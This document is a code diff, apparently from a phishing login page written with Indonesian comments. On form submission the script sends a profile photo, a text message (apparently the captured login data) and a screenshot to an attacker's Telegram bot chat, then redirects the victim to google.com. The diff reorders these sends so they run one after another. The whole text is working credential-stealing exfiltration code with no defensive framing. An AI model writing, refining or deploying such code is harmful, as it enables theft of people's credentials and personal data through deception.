@@ -70,12 +70,19 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     let sendProfilePhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`;
     let sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-    Promise.all([
-        fetch(sendProfilePhotoUrl),
-        fetch(sendMessageUrl),
-        ambilScreenshot()
-    ]).then(() => {
-        console.log("✅ Semua data terkirim!");
-        window.location.href = "https://www.google.com";
-    }).catch(error => console.error("❌ Error:", error));
+    // Kirim foto profil dulu, lalu teks, lalu screenshot
+    fetch(sendProfilePhotoUrl)
+        .then(() => {
+            console.log("✅ Foto profil terkirim!");
+            return fetch(sendMessageUrl);
+        })
+        .then(() => {
+            console.log("✅ Pesan teks terkirim!");
+            return ambilScreenshot();
+        })
+        .then(() => {
+            console.log("✅ Semua data terkirim!");
+            window.location.href = "https://www.google.com";
+        })
+        .catch(error => console.error("❌ Error:", error));
 });
